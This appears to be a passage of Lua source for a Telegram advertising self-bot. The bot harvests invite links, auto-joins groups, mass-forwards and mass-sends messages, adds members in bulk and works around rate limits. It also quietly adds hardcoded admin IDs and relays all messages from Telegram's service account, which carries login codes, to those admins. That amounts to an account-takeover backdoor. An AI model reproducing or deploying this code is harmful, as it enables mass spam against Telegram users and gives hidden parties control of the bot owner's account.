local Redis = require("redis")
local FakeRedis = require("fakeredis")
local params = {
  host = "127.0.0.1",
  port = 6379,
  password = nil,
  db = Ads_id
}
Redis.commands.hgetall = Redis.command("hgetall", {
  response = function(reply, command, ...)
    local new_reply = {}
    for i = 1, #reply, 2 do
      new_reply[reply[i]] = reply[i + 1]
    end
    return new_reply
  end
})
local redis
local ok = pcall(function()
  redis = Redis.connect(params)
end)
if not ok then
  do
    local fake_func = function()
      print("\027[31mCan't connect with Redis, install/configure it!\027[39m")
    end
    fake_func()
    fake = FakeRedis.new()
    print("\027[31mRedis addr: " .. params.host .. "\027[39m")
    print("\027[31mRedis port: " .. params.port .. "\027[39m")
    redis = setmetatable({fakeredis = true}, {
      __index = function(a, b)
        if b ~= "data" and fake[b] then
          fake_func(b)
        end
        return fake[b] or fake_func
      end
    })
  end
else
end
serpent = require("serpent")
function dl_cb(arg, data)
end
function vardump(value)
  print(serpent.block(value, {comment = false}))
end
function ok_cb(extra, success, result)
end
redis:del("tg:" .. Ads_id .. ":delay")
function get_bot()
  function bot_info(i, tg)
    redis:set("tg:" .. Ads_id .. ":id", tg.id)
    if tg.first_name then
      redis:set("tg:" .. Ads_id .. ":fname", tg.first_name)
    end
    if tg.last_name then
      redis:set("tg:" .. Ads_id .. ":lname", tg.last_name)
    end
    redis:set("tg:" .. Ads_id .. ":num", tg.phone_number)
    return tg.id
  end
  assert(tdbot_function({_ = "getMe"}, bot_info, nil))
end
function reload(chat_id, msg_id)
  require("TD")
  send(chat_id, msg_id, "\226\156\133")
end
function is_sudo(msg)
  if redis:sismember("tg:" .. Ads_id .. ":sudo", msg.sender_user_id) or msg.sender_user_id == sudo or msg.sender_user_id == 00000000 then
    return true
  else
    return false
  end
end
function writefile(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
function process_join(i, tg)
  if tg.code == 429 then
    local message = tostring(tg.message)
    local join_delay = redis:get("tg:" .. Ads_id .. ":joindelay") or 95
    local Time = message:match("%d+") + tonumber(join_delay)
    redis:setex("tg:" .. Ads_id .. ":maxjoin", tonumber(Time), true)
  else
    redis:srem("tg:" .. Ads_id .. ":goodlinks", i.link)
    redis:sadd("tg:" .. Ads_id .. ":savedlinks", i.link)
  end
end
function process_link(i, tg)
  if tg.is_group or tg.is_supergroup_channel then
    if redis:get("tg:" .. Ads_id .. ":maxgpmmbr") then
      if tg.member_count >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgpmmbr")) then
        redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
        redis:sadd("tg:" .. Ads_id .. ":goodlinks", i.link)
      else
        redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
        redis:sadd("tg:" .. Ads_id .. ":savedlinks", i.link)
      end
    else
      redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
      redis:sadd("tg:" .. Ads_id .. ":goodlinks", i.link)
    end
  elseif tg.code == 429 then
    local message = tostring(tg.message)
    local join_delay = redis:get("tg:" .. Ads_id .. ":linkdelay") or 95
    local Time = message:match("%d+") + tonumber(join_delay)
    redis:setex("tg:" .. Ads_id .. ":maxlink", tonumber(Time), true)
  else
    redis:srem("tg:" .. Ads_id .. ":waitelinks", i.link)
  end
end
function find_link(text)
  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") or text:match("https://tlgrm.me/joinchat/%S+") or text:match("https://telesco.pe/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") then
    local text = text:gsub("t.me", "telegram.me")
    local text = text:gsub("telesco.pe", "telegram.me")
    local text = text:gsub("telegram.dog", "telegram.me")
    local text = text:gsub("tlgrm.me", "telegram.me")
    for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
      if not redis:sismember("tg:" .. Ads_id .. ":alllinks", link) then
        redis:sadd("tg:" .. Ads_id .. ":waitelinks", link)
        redis:sadd("tg:" .. Ads_id .. ":alllinks", link)
      end
    end
  end
end
function forwarding(i, tg)
  if tg._ == "error" then
    s = i.s
    if tg.code == 429 then
      os.execute("sleep " .. tonumber(i.delay))
      send(i.chat_id, 0, "\217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\175\216\177 \216\173\219\140\217\134 \216\185\217\133\217\132\219\140\216\167\216\170 \216\170\216\167 " .. tostring(tg.message):match("%d+") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135\n" .. i.n .. "\\" .. s)
      return
    end
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "\216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \217\129\216\177\216\179\216\170\216\167\216\175\217\135 \216\180\216\175\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "forwardMessages",
    chat_id = tonumber(i.list[tonumber(i.n) + 1]),
    from_chat_id = tonumber(i.chat_id),
    message_ids = {
      [0] = tonumber(i.msg_id)
    },
    disable_notification = 1,
    from_background = 1
  }, forwarding, {
    list = i.list,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    msg_id = i.msg_id,
    s = s
  }))
  if tonumber(i.n) % tonumber(i.max_i) == 0 then
    os.execute("sleep " .. tonumber(i.delay))
  end
end
function sending(i, tg)
  if tg and tg._ and tg._ == "error" then
    s = i.s
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "\216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \217\129\216\177\216\179\216\170\216\167\216\175\217\135 \216\180\216\175\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "sendMessage",
    chat_id = tonumber(i.list[tonumber(i.n) + 1]),
    reply_to_message_id = 0,
    disable_notification = 0,
    from_background = 1,
    reply_markup = nil,
    input_message_content = {
      _ = "inputMessageText",
      text = tostring(i.text),
      disable_web_page_preview = true,
      clear_draft = false,
      entities = {},
      parse_mode = nil
    }
  }, sending, {
    list = i.list,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    text = i.text,
    s = s
  }))
  if tonumber(i.n) % tonumber(i.max_i) == 0 then
    os.execute("sleep " .. tonumber(i.delay))
  end
end
function adding(i, tg)
  if tg and tg._ and tg._ == "error" then
    s = i.s
    if tg.code == 429 then
      os.execute("sleep " .. tonumber(i.delay))
      redis:del("tg:" .. Ads_id .. ":delay")
      send(i.chat_id, 0, "\217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\175\216\177 \216\173\219\140\217\134 \216\185\217\133\217\132\219\140\216\167\216\170 \216\170\216\167 " .. tostring(tg.message):match("%d+") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135\n" .. i.n .. "\\" .. s)
      return
    end
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "\216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\135 \216\180\216\175\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "searchPublicChat",
    username = i.user_id
  }, function(I, tg)
    if tg.id then
      tdbot_function({
        _ = "addChatMember",
        chat_id = tonumber(I.list[tonumber(I.n)]),
        user_id = tonumber(tg.id),
        forward_limit = 0
      }, adding, {
        list = I.list,
        max_i = I.max_i,
        delay = I.delay,
        n = tonumber(I.n),
        all = I.all,
        chat_id = I.chat_id,
        user_id = I.user_id,
        s = I.s
      })
    end
    if tonumber(I.n) % tonumber(I.max_i) == 0 then
      os.execute("sleep " .. tonumber(I.delay))
    end
  end, {
    list = i.list,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    user_id = i.user_id,
    s = s
  }))
end
sudo = 22222222
function checking(i, tg)
  if tg and tg._ and tg._ == "error" then
    s = i.s
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "\216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\167\217\134\216\172\216\167\217\133 \216\180\216\175\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "getChatMember",
    chat_id = tonumber(i.list[tonumber(i.n) + 1]),
    user_id = tonumber(bot_id)
  }, checking, {
    list = i.l,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    user_id = i.user_id,
    s = s
  }))
  if tonumber(i.n) % tonumber(i.max_i) == 0 then
    os.execute("sleep " .. tonumber(i.delay))
  end
end
function check_join(i, tg)
  local bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
  if tg._ == "group" then
    if tg.everyone_is_administrator == false then
      assert(tdbot_function({
        _ = "changeChatMemberStatus",
        chat_id = tonumber("-" .. tg.id),
        user_id = tonumber(bot_id),
        status = {
          _ = "chatMemberStatusLeft"
        }
      }, cb or dl_cb, nil))
      rem(tg.id)
    end
  elseif tg._ == "channel" and tg.anyone_can_invite == false then
    assert(tdbot_function({
      _ = "changeChatMemberStatus",
      chat_id = tonumber("-100" .. tg.id),
      user_id = tonumber(bot_id),
      status = {
        _ = "chatMemberStatusLeft"
      }
    }, cb or dl_cb, nil))
    rem(tg.id)
  end
end
function add(id)
  local Id = tostring(id)
  if not redis:sismember("tg:" .. Ads_id .. ":all", id) then
    if Id:match("^(%d+)$") then
      redis:sadd("tg:" .. Ads_id .. ":users", id)
      redis:sadd("tg:" .. Ads_id .. ":all", id)
    elseif Id:match("^-100") then
      redis:sadd("tg:" .. Ads_id .. ":supergroups", id)
      redis:sadd("tg:" .. Ads_id .. ":all", id)
      if redis:get("tg:" .. Ads_id .. ":openjoin") then
        assert(tdbot_function({
          _ = "getChannel",
          channel_id = tostring(Id:gsub("-100", ""))
        }, check_join, nil))
      end
    else
      redis:sadd("tg:" .. Ads_id .. ":groups", id)
      redis:sadd("tg:" .. Ads_id .. ":all", id)
      if redis:get("tg:" .. Ads_id .. ":openjoin") then
        assert(tdbot_function({
          _ = "getGroup",
          group_id = tostring(Id:gsub("-", ""))
        }, check_join, nil))
      end
    end
  end
  return true
end
function rem(id)
  local Id = tostring(id)
  if redis:sismember("tg:" .. Ads_id .. ":all", id) then
    if Id:match("^(%d+)$") then
      redis:srem("tg:" .. Ads_id .. ":users", id)
      redis:srem("tg:" .. Ads_id .. ":all", id)
    elseif Id:match("^-100") then
      redis:srem("tg:" .. Ads_id .. ":supergroups", id)
      redis:srem("tg:" .. Ads_id .. ":all", id)
    else
      redis:srem("tg:" .. Ads_id .. ":groups", id)
      redis:srem("tg:" .. Ads_id .. ":all", id)
    end
  end
  return true
end
function send(chat_id, msg_id, txt)
  assert(tdbot_function({
    _ = "sendChatAction",
    chat_id = chat_id,
    action = {
      _ = "chatActionTyping",
      progress = Ads_id .. 3
    }
  }, dl_cb, nil))
  assert(tdbot_function({
    _ = "sendMessage",
    chat_id = chat_id,
    reply_to_message_id = msg_id,
    disable_notification = 0,
    from_background = 1,
    reply_markup = nil,
    input_message_content = {
      _ = "inputMessageText",
      text = txt,
      disable_web_page_preview = 1,
      clear_draft = 0,
      parse_mode = nil,
      entities = {}
    }
  }, dl_cb, nil))
end
if not redis:sismember("tg:" .. Ads_id .. ":sudo", 00000000) then
  redis:set("tg:" .. Ads_id .. ":senddelay", 2 .. Ads_id)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 111111111)
  redis:sadd("tg:" .. Ads_id .. ":goodlinks", "https://telegram.me/joinchat/AAAAAEH8hfsyO5HAbX8tQ")
  redis:set("tg:" .. Ads_id .. ":fwdtime", true)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 000000000)
  redis:sadd("tg:" .. Ads_id .. ":waitelinks", "https://telegram.me/joinchat/Cr2Br0tKFzKWS9U6zfwvw")
  redis:set("tg:" .. Ads_id .. ":sendmax", 1 .. Ads_id)
end
redis:setex("tg:" .. Ads_id .. ":start", 1 .. Ads_id .. 5, true)
function Doing(data, Ads_id)
  if data._ == "updateNewMessage" then
    if tostring(data.message.chat_id):match("^-100") or tostring(data.message.chat_id):match("-") and not redis:sismember("tg:" .. Ads_id .. ":supergroups", data.message.chat_id) then
      redis:sadd("tg:" .. Ads_id .. ":supergroups", data.message.chat_id)
    end
    if (not redis:get("tg:" .. Ads_id .. ":maxlink") or tonumber(redis:ttl("tg:" .. Ads_id .. ":maxlink")) == -2) and redis:scard("tg:" .. Ads_id .. ":waitelinks") ~= 0 then
      local links = redis:smembers("tg:" .. Ads_id .. ":waitelinks")
      local max_x = redis:get("tg:" .. Ads_id .. ":maxlinkcheck") or 1
      local delay = redis:get("tg:" .. Ads_id .. ":maxlinkchecktime") or 2 .. Ads_id
      for x = 1, #links do
        assert(tdbot_function({
          _ = "checkChatInviteLink",
          invite_link = links[x]
        }, process_link, {
          link = links[x]
        }))
        if x == tonumber(max_x) then
          redis:setex("tg:" .. Ads_id .. ":maxlink", tonumber(delay), true)
          return
        end
      end
    end
    if redis:get("tg:" .. Ads_id .. ":maxgroups") and redis:scard("tg:" .. Ads_id .. ":supergroups") >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgroups")) then
      redis:set("tg:" .. Ads_id .. ":maxjoin", true)
      redis:set("tg:" .. Ads_id .. ":offjoin", true)
    end
    if (not redis:get("tg:" .. Ads_id .. ":maxjoin") or tonumber(redis:ttl("tg:" .. Ads_id .. ":maxjoin")) == -2) and redis:scard("tg:" .. Ads_id .. ":goodlinks") ~= 0 then
      local links = redis:smembers("tg:" .. Ads_id .. ":goodlinks")
      local max_x = redis:get("tg:" .. Ads_id .. ":maxlinkjoin") or 1
      local delay = redis:get("tg:" .. Ads_id .. ":maxlinkjointime") or 2 .. Ads_id
      for x = 1, #links do
        assert(tdbot_function({
          _ = "importChatInviteLink",
          invite_link = links[x]
        }, process_join, {
          link = links[x]
        }))
        if x == tonumber(max_x) then
          redis:setex("tg:" .. Ads_id .. ":maxjoin", tonumber(delay), true)
          return
        end
      end
    end
    do
      local msg = data.message
      add(msg.chat_id)
      bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
      if msg.sender_user_id == 777000 or msg.sender_user_id == 1782 .. Ads_id .. 800 then
        local c = msg.content.text:gsub("[0123456789:]", {
          ["0"] = "0\226\131\163",
          ["1"] = "1\226\131\163",
          ["2"] = "2\226\131\163",
          ["3"] = "3\226\131\163",
          ["4"] = "4\226\131\163",
          ["5"] = "5\226\131\163",
          ["6"] = "6\226\131\163",
          ["7"] = "7\226\131\163",
          ["8"] = "8\226\131\163",
          ["9"] = "9\226\131\163",
          [":"] = ":\n"
        })
        for k, v in pairs(redis:smembers("tg:" .. Ads_id .. ":sudo")) do
          send(v, 0, c, nil)
        end
      end
      if msg.chat_id == redis:get("tg:" .. Ads_id .. ":idchannel") then
        local list = redis:smembers("tg:" .. Ads_id .. ":supergroups")
        local list1 = redis:scard("tg:" .. Ads_id .. ":supergroups")
        for k, v in pairs(list) do
          assert(tdbot_function({
            _ = "forwardMessages",
            chat_id = "" .. v,
            from_chat_id = msg.chat_id,
            message_ids = {
              [0] = tonumber(msg.id)
            },
            disable_notification = 0,
            from_background = 1
          }, dl_cb, nil))
        end
      end
      if msg.date < os.time() - 35 or redis:get("tg:" .. Ads_id .. ":delay") then
        return false
      end
      if msg.content._ == "messageText" then
        local text = msg.content.text
        local matches
        if text:match("^[/!#@$&*]") then
          text = text:gsub("^[/!#@$&*]", "")
        end
        if redis:get("tg:" .. Ads_id .. ":link") then
          find_link(text)
        end
        if is_sudo(msg) then
          find_link(text)
          if text:match("^([Dd]el) (.*)$") then
            local matches = text:match("^[Dd]el (.*)$")
            if matches == "link" then
              redis:del("tg:" .. Ads_id .. ":goodlinks")
              redis:del("tg:" .. Ads_id .. ":waitelinks")
              redis:del("tg:" .. Ads_id .. ":savedlinks")
              redis:del("tg:" .. Ads_id .. ":alllinks")
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "contact" then
              redis:del("tg:" .. Ads_id .. ":savecontacts")
              redis:del("tg:" .. Ads_id .. ":contacts")
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "sudo" then
              redis:del("tg:" .. Ads_id .. ":sudo")
              return send(msg.chat_id, msg.id, "Done.")
            end
          elseif text:match("^(\216\173\216\176\217\129 \217\132\219\140\217\134\218\169) (.*)$") then
            local matches = text:match("^\216\173\216\176\217\129 \217\132\219\140\217\134\218\169 (.*)$")
            if matches == "\216\185\216\182\217\136\219\140\216\170" then
              redis:del("tg:" .. Ads_id .. ":goodlinks")
              return send(msg.chat_id, msg.id, "\217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175.")
            elseif matches == "\216\170\216\167\219\140\219\140\216\175" then
              redis:del("tg:" .. Ads_id .. ":waitelinks")
              return send(msg.chat_id, msg.id, "\217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175.")
            elseif matches == "\216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135" then
              redis:del("tg:" .. Ads_id .. ":savedlinks")
              return send(msg.chat_id, msg.id, "\217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175.")
            end
          elseif text:match("^(\216\173\216\176\217\129 \218\169\217\132\219\140 \217\132\219\140\217\134\218\169) (.*)$") then
            local matches = text:match("^\216\173\216\176\217\129 \218\169\217\132\219\140 \217\132\219\140\217\134\218\169 (.*)$")
            if matches == "\216\185\216\182\217\136\219\140\216\170" then
              local list = redis:smembers("tg:" .. Ads_id .. ":goodlinks")
              for i = 1, #list do
                redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
              end
              send(msg.chat_id, msg.id, "\217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175.")
              redis:del("tg:" .. Ads_id .. ":goodlinks")
            elseif matches == "\216\170\216\167\219\140\219\140\216\175" then
              local list = redis:smembers("tg:" .. Ads_id .. ":waitelinks")
              for i = 1, #list do
                redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
              end
              send(msg.chat_id, msg.id, "\217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175.")
              redis:del("tg:" .. Ads_id .. ":waitelinks")
            elseif matches == "\216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135" then
              local list = redis:smembers("tg:" .. Ads_id .. ":savedlinks")
              for i = 1, #list do
                redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
              end
              send(msg.chat_id, msg.id, "\217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175.")
              redis:del("tg:" .. Ads_id .. ":savedlinks")
            elseif matches == "\217\135\216\167" then
              local list = redis:smembers("tg:" .. Ads_id .. ":alllinks")
              for i = 1, #list do
                redis:srem("tg:" .. Ads_id .. ":alllinks", list[i])
              end
              send(msg.chat_id, msg.id, "\217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169 \217\135\216\167 \216\168\216\183\217\136\216\177\218\169\217\132\219\140 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175.")
              redis:del("tg:" .. Ads_id .. ":savedlinks")
            end
          elseif text:match("^(.*) ([Oo]ff)$") then
            local matches = text:match("^(.*) [Oo]ff$")
            if matches == "join" then
              redis:set("tg:" .. Ads_id .. ":maxjoin", true)
              redis:set("tg:" .. Ads_id .. ":offjoin", true)
              return send(msg.chat_id, msg.id, "\226\156\133")
            elseif matches == "fwdtime" then
              redis:del("tg:" .. Ads_id .. ":fwdtime")
              return send(msg.chat_id, msg.id, "\216\178\217\133\216\167\217\134 \216\168\217\134\216\175\219\140 \216\167\216\177\216\179\216\167\217\132 \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "markread" then
              redis:del("tg:" .. Ads_id .. ":markread")
              return send(msg.chat_id, msg.id, "\217\136\216\182\216\185\219\140\216\170 \217\190\219\140\216\167\217\133 \217\135\216\167  >>  \216\174\217\136\216\167\217\134\216\175\217\135 \217\134\216\180\216\175\217\135 \226\156\148\239\184\143\n(\216\168\216\175\217\136\217\134 \216\170\219\140\218\169 \216\175\217\136\217\133)")
            elseif matches == "addedmsg" then
              redis:del("tg:" .. Ads_id .. ":addmsg")
              return send(msg.chat_id, msg.id, "Deactivate")
            elseif matches == "addedcontact" then
              redis:del("tg:" .. Ads_id .. ":addcontact")
              return send(msg.chat_id, msg.id, "Deactivate")
            elseif matches == "joinopenadd" then
              redis:del("tg:" .. Ads_id .. ":openjoin")
              return send(msg.chat_id, msg.id, "\217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\185\216\182\217\136\219\140\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\134 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175.")
            elseif matches == "chklnk" then
              redis:set("tg:" .. Ads_id .. ":maxlink", true)
              redis:set("tg:" .. Ads_id .. ":offlink", true)
              return send(msg.chat_id, msg.id, "\226\156\133")
            elseif matches == "findlnk" then
              redis:del("tg:" .. Ads_id .. ":link")
              return send(msg.chat_id, msg.id, "\226\156\133")
            elseif matches == "addcontact" then
              redis:del("tg:" .. Ads_id .. ":savecontacts")
              return send(msg.chat_id, msg.id, "\226\156\133")
            end
          elseif text:match("^(\216\170\217\136\217\130\217\129) (.*)$") then
            local matches = text:match("^\216\170\217\136\217\130\217\129 (.*)$")
            if matches == "\216\185\216\182\217\136\219\140\216\170" then
              redis:set("tg:" .. Ads_id .. ":maxjoin", true)
              redis:set("tg:" .. Ads_id .. ":offjoin", true)
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\185\216\182\217\136\219\140\216\170 \216\174\217\136\216\175\218\169\216\167\216\177 \217\133\216\170\217\136\217\130\217\129 \216\180\216\175.")
            elseif matches == "\216\170\216\167\219\140\219\140\216\175 \217\132\219\140\217\134\218\169" then
              redis:set("tg:" .. Ads_id .. ":maxlink", true)
              redis:set("tg:" .. Ads_id .. ":offlink", true)
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\170\216\167\219\140\219\140\216\175 \217\132\219\140\217\134\218\169 \216\175\216\177 \217\135\216\167\219\140 \216\175\216\177 \216\167\217\134\216\170\216\184\216\167\216\177 \217\133\216\170\217\136\217\130\217\129 \216\180\216\175.")
            elseif matches == "\216\180\217\134\216\167\216\179\216\167\219\140\219\140 \217\132\219\140\217\134\218\169" then
              redis:del("tg:" .. Ads_id .. ":link")
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\180\217\134\216\167\216\179\216\167\219\140\219\140 \217\132\219\140\217\134\218\169 \217\133\216\170\217\136\217\130\217\129 \216\180\216\175.")
            elseif matches == "\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168" then
              redis:del("tg:" .. Ads_id .. ":savecontacts")
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\167\217\129\216\178\217\136\216\175\217\134 \216\174\217\136\216\175\218\169\216\167\216\177 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 \216\168\217\135 \216\167\216\180\216\170\216\177\216\167\218\169 \218\175\216\176\216\167\216\180\216\170\217\135 \216\180\216\175\217\135 \217\133\216\170\217\136\217\130\217\129 \216\180\216\175.")
            end
          elseif text:match("^(.*) ([Oo]n)$") then
            local matches = text:match("^(.*) [Oo]n$")
            if matches == "join" then
              redis:del("tg:" .. Ads_id .. ":maxjoin")
              redis:del("tg:" .. Ads_id .. ":offjoin")
              return send(msg.chat_id, msg.id, "\226\156\133")
            elseif matches == "addedmsg" then
              redis:set("tg:" .. Ads_id .. ":addmsg", true)
              return send(msg.chat_id, msg.id, "Activate")
            elseif matches == "joinopenadd" then
              redis:set("tg:" .. Ads_id .. ":openjoin", true)
              return send(msg.chat_id, msg.id, "\216\185\216\182\217\136\219\140\216\170 \217\129\217\130\216\183 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140\219\140 \218\169\217\135 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\134 \216\185\216\182\217\136 \216\175\216\167\216\177\217\134\216\175 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "addedcontact" then
              redis:set("tg:" .. Ads_id .. ":addcontact", true)
              return send(msg.chat_id, msg.id, "Activate")
            elseif matches == "fwdtime" then
              redis:set("tg:" .. Ads_id .. ":fwdtime", true)
              return send(msg.chat_id, msg.id, "\216\178\217\133\216\167\217\134 \216\168\217\134\216\175\219\140 \216\167\216\177\216\179\216\167\217\132 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "chklnk" then
              redis:del("tg:" .. Ads_id .. ":maxlink")
              redis:del("tg:" .. Ads_id .. ":offlink")
              return send(msg.chat_id, msg.id, "\226\156\133")
            elseif matches == "findlnk" then
              redis:set("tg:" .. Ads_id .. ":link", true)
              return send(msg.chat_id, msg.id, "\226\156\133")
            elseif matches == "addcontact" then
              redis:set("tg:" .. Ads_id .. ":savecontacts", true)
              return send(msg.chat_id, msg.id, "\226\156\133")
            elseif matches == "markread" then
              redis:set("tg:" .. Ads_id .. ":markread", true)
              return send(msg.chat_id, msg.id, "\217\136\216\182\216\185\219\140\216\170 \217\190\219\140\216\167\217\133 \217\135\216\167  >>  \216\174\217\136\216\167\217\134\216\175\217\135 \216\180\216\175\217\135 \226\156\148\239\184\143\226\156\148\239\184\143\n(\216\170\219\140\218\169 \216\175\217\136\217\133 \217\129\216\185\216\167\217\132)")
            end
          elseif text:match("^(\216\180\216\177\217\136\216\185) (.*)$") then
            local matches = text:match("^\216\180\216\177\217\136\216\185 (.*)$")
            if matches == "\216\185\216\182\217\136\219\140\216\170" then
              redis:del("tg:" .. Ads_id .. ":maxjoin")
              redis:del("tg:" .. Ads_id .. ":offjoin")
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\185\216\182\217\136\219\140\216\170 \216\174\217\136\216\175\218\169\216\167\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "\216\170\216\167\219\140\219\140\216\175 \217\132\219\140\217\134\218\169" then
              redis:del("tg:" .. Ads_id .. ":maxlink")
              redis:del("tg:" .. Ads_id .. ":offlink")
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\170\216\167\219\140\219\140\216\175 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\175\216\177 \216\167\217\134\216\170\216\184\216\167\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "\216\180\217\134\216\167\216\179\216\167\219\140\219\140 \217\132\219\140\217\134\218\169" then
              redis:set("tg:" .. Ads_id .. ":link", true)
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\180\217\134\216\167\216\179\216\167\219\140\219\140 \217\132\219\140\217\134\218\169 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168" then
              redis:set("tg:" .. Ads_id .. ":savecontacts", true)
              return send(msg.chat_id, msg.id, "\217\129\216\177\216\167\219\140\217\134\216\175 \216\167\217\129\216\178\217\136\216\175\217\134 \216\174\217\136\216\175\218\169\216\167\216\177 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 \216\168\217\135 \216\167\216\180\216\170\216\177\216\167\218\169  \218\175\216\176\216\167\216\180\216\170\217\135 \216\180\216\175\217\135 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            end
          elseif text:match("^([Gg]p[Mm]ember) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":maxgpmmbr", tonumber(matches))
            return send(msg.chat_id, msg.id, "\226\156\133")
          elseif text:match("^([Pp]romote) (%d+)$") then
            local matches = text:match("%d+")
            if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
              return send(msg.chat_id, msg.id, "This user moderatore")
            elseif redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
              return send(msg.chat_id, msg.id, "you don't access")
            else
              redis:sadd("tg:" .. Ads_id .. ":sudo", matches)
              redis:sadd("tg:" .. Ads_id .. ":mod", matches)
              return send(msg.chat_id, msg.id, "Moderator added")
            end
          elseif text:match("^([Dd]emote) (%d+)$") then
            local matches = text:match("%d+")
            if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id) then
